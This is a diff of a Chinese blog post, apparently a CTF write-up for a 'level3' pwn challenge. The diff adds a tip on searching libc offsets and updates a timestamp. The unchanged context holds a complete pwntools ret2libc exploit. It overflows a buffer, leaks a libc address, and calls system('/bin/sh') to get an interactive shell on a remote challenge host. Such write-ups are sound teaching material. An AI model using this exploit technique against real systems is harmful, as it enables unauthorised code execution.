@@ -481,6 +481,10 @@
 <h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>我真的佛了，打本地打了半天打不通，然后远程能打通</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./level3'</span>)</span><br><span class="line">sh = remote(<span class="string">"220.249.52.133"</span>,<span class="string">"43938"</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">start_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line">payload = (<span class="number">0x88</span> + <span class="number">4</span>) * <span class="string">'a'</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(start_got) + p32(<span class="number">4</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">start_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">'libc_32.so.6'</span>)</span><br><span class="line">base = start_addr - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = base + <span class="number">0x15902b</span> </span><br><span class="line">payload = (<span class="number">0x88</span> + <span class="number">4</span>) * <span class="string">'a'</span> + p32(sys_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p>在libc中搜偏移</p>
+<p>strings -a -t x libc_32.so.6 | grep “__libc_start_main”</p>
+</blockquote>
 
           
             <div class='article_footer'>
@@ -554,7 +558,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-03T01:31:26+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-03T01:32:53+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>最后更新于：Oct 3, 2020</p>
